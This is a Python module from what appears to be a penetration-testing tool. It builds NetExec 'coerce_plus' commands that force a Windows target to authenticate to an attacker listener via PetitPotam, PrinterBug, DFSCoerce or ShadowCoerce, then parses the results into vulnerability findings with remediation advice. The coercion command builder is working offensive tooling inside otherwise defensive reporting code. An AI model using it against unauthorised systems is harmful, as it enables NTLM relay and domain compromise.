r"""Coercion (forced authentication) - pure parser, nxc argv, and findings.

Active RPC forced-authentication: coerce a target's machine account to authenticate to a
listener we control via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM (DFSCoerce), or
MS-FSRVP (ShadowCoerce). It ACTIVELY touches a target over RPC, so - like `poison`/`spray` -
it is a gated CLI command that NEVER runs in `scan`; this module holds only the pure pieces
(no `Engine` subclass, not registered as a default engine), mirroring engines/responder.py vs
poison.py and engines/spray.py vs spray.py. The gated `run_coerce` orchestrator and
`cmd_coerce` come in step 2 (see docs/COERCION.md).

Orchestrates NetExec's `coerce_plus` module (`nxc smb <t> -M coerce_plus -o LISTENER=<us>`).
Coercion only TRIGGERS the auth; the coerced NetNTLMv2 is captured by a separate `redness
poison` (Responder) listener and flows through the existing crack pipeline (docs/NETNTLM.md).
So this module recovers no credential (no `meta["credentials"]`); it emits per-vector
`coercion-*` vulnerability findings, reusing `Category.CONFIG` (no schema change).

VERIFY ON KALI: nxc has no py3.12 wheel and could not be introspected in-sandbox, so the
exact `coerce_plus` output lines and option keys (`LISTENER`, `METHOD`) are from public
usage - the captured fixture in tests/test_coerce.py is the source of truth. If the real
module differs, only `parse_coerce_plus`/`coerce_argv` change.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

from ..findings import Category, Evidence, Finding, Severity


@dataclass
class CoerceResult:
    method: str          # canonical key: petitpotam / printerbug / dfscoerce / shadowcoerce
    coerced: bool        # True = target authenticated to us (vulnerable); False = patched/failed


@dataclass
class _Vector:
    name: str            # display name, e.g. "PetitPotam (MS-EFSR)"
    remediation: str
    refs: tuple[str, ...] = ()   # extra references beyond the shared MITRE T1187


# Per-vector metadata. CVEs are cited only where confident (PetitPotam advisory); the others
# have no single authoritative CVE, so they carry only the shared MITRE T1187 reference.
_VECTORS: dict[str, _Vector] = {
    "petitpotam": _Vector(
        "PetitPotam (MS-EFSR)",
        "Apply KB5005413 and filter EFSRPC; enable SMB signing and LDAP channel binding/EPA "
        "to block NTLM relay of the coerced authentication.",
        ("https://msrc.microsoft.com/update-guide/vulnerability/ADV210003",),
    ),
    "printerbug": _Vector(
        "PrinterBug (MS-RPRN)",
        "Disable the Print Spooler service on Domain Controllers and any server that does not "
        "need it; enable SMB signing and LDAP channel binding/EPA.",
    ),
    "dfscoerce": _Vector(
        "DFSCoerce (MS-DFSNM)",
        "Apply the DFS coercion patches; enable SMB signing and LDAP channel binding/EPA to "
        "block relay.",
    ),
    "shadowcoerce": _Vector(
        "ShadowCoerce (MS-FSRVP)",
        "Disable or patch VSS-over-SMB (FSRVP); enable SMB signing and LDAP channel "
        "binding/EPA.",
    ),
}

# nxc `coerce_plus` METHOD option value per canonical key (for a single-vector run).
_MODULE_METHOD = {
    "petitpotam": "PetitPotam", "printerbug": "PrinterBug",
    "dfscoerce": "DFSCoerce", "shadowcoerce": "ShadowCoerce",
}


# --- pure parser (tolerant of nxc's "COERCE_PLUS <host> <port> <name>" line prefix) --- #
# Aliases we accept for each coercion vector (matched case-insensitively as substrings).
_ALIASES: dict[str, tuple[str, ...]] = {
    "petitpotam": ("petitpotam", "ms-efsr", "efsrpc", "efsr"),
    "printerbug": ("printerbug", "printer bug", "ms-rprn", "rprn", "spooler", "spoolsample"),
    "dfscoerce": ("dfscoerce", "ms-dfsnm", "dfsnm"),
    "shadowcoerce": ("shadowcoerce", "ms-fsrvp", "fsrvp"),
}
# A negative verdict is checked FIRST because "not vulnerable" also contains "vulnerable".
_NEG = re.compile(r"(?i)not vulnerable|not\s+attack|failed|patched|error|no coercion")
_POS = re.compile(r"(?i)vulnerable|success|coerced|triggered|authentication received|"
                  r"auth received|pwned|attack success")


def _methods_in(line: str) -> list[str]:
    low = line.lower()
    return [m for m, aliases in _ALIASES.items() if any(a in low for a in aliases)]


def parse_coerce_plus(stdout: str) -> list[CoerceResult]:
    """Parse `nxc -M coerce_plus` output into per-vector results, in first-seen order.

    A line contributes only if it names a vector AND carries a verdict: a positive keyword
    (vulnerable/success/coerced/authentication received/...) -> coerced=True, or a negative one
    (not vulnerable/failed/patched/...) -> coerced=False. A bare mention with no verdict (e.g.
    "Checking PetitPotam...") is ignored. If a vector appears both ways, the positive wins.
    """
    verdicts: dict[str, bool] = {}
    order: list[str] = []
    for line in stdout.splitlines():
        methods = _methods_in(line)
        if not methods:
            continue
        neg = bool(_NEG.search(line))
        pos = bool(_POS.search(line)) and not neg
        if not (pos or neg):
            continue                       # a mention without a verdict - skip
        for meth in methods:
            if meth not in verdicts:
                order.append(meth)
                verdicts[meth] = pos
            elif pos:
                verdicts[meth] = True      # a success overrides an earlier negative
    return [CoerceResult(method=m, coerced=verdicts[m]) for m in order]


def coerce_argv(host: str, listener: str, *, method: str = "all",
                username: "str | None" = None, password: "str | None" = None,
                domain: "str | None" = None, nthash: "str | None" = None,
                kerberos: bool = False) -> list[str]:
    """nxc args (after the `nxc` binary) for a `coerce_plus` run against `host`.

    `listener` is the attacker IP the coerced auth is directed to (a running `redness poison`
    listener catches it). `method="all"` runs every vector; a specific key adds `-o METHOD=`.
    """
    argv = ["smb", host]
    if username:
        argv += ["-u", username]
    if password is not None:
        argv += ["-p", password]
    if nthash:
        argv += ["-H", nthash]
    if domain:
        argv += ["-d", domain]
    if kerberos:
        argv.append("-k")
    argv += ["-M", "coerce_plus", "-o", f"LISTENER={listener}"]
    if method and method != "all":
        argv += ["-o", f"METHOD={_MODULE_METHOD[method]}"]
    return argv


# --- findings --- #
_T1187 = "https://attack.mitre.org/techniques/T1187/"     # Forced Authentication


def build_findings(results: list[CoerceResult], *, target: str, is_dc: bool = False,
                   listener: str = "", credentialed: bool = True) -> list[Finding]:
    """One `coercion-<vector>` Finding per SUCCESSFULLY coerced vector (patched/failed vectors
    emit nothing). Severity is CRITICAL when `target` is a Domain Controller (coercing a DC
    machine account is the relay->LDAP/AD CS ESC8->DA primitive), else HIGH. Reuses
    `Category.CONFIG`; recovers no credential, so no `meta["credentials"]`.
    """
    findings: list[Finding] = []
    for r in results:
        if not r.coerced:
            continue
        spec = _VECTORS[r.method]
        sev = Severity.CRITICAL if is_dc else Severity.HIGH
        impact = ("Forces the target's machine account to authenticate to an attacker-controlled "
                  "host over SMB; the captured NetNTLMv2 can be relayed to AD services.")
        if is_dc:
            impact += (" Coercing a Domain Controller enables relay to LDAP / AD CS (ESC8) and "
                       "full domain compromise.")
        detail = f"{spec.name} coerced {target} to authenticate"
        if listener:
            detail += f" to {listener}"
        findings.append(Finding(
            id=f"coercion-{r.method}",
            title=f"{spec.name} forced authentication: {target}",
            severity=sev,
            category=Category.CONFIG,
            description=f"{target} can be coerced into authenticating to an arbitrary host via "
                        f"{spec.name} forced authentication.",
            impact=impact,
            remediation=spec.remediation,
            affected=[target],
            evidence=[Evidence(source="netexec", detail=detail)],
            references=[_T1187, *spec.refs],
            credentialed=credentialed,
        ))
    return findings
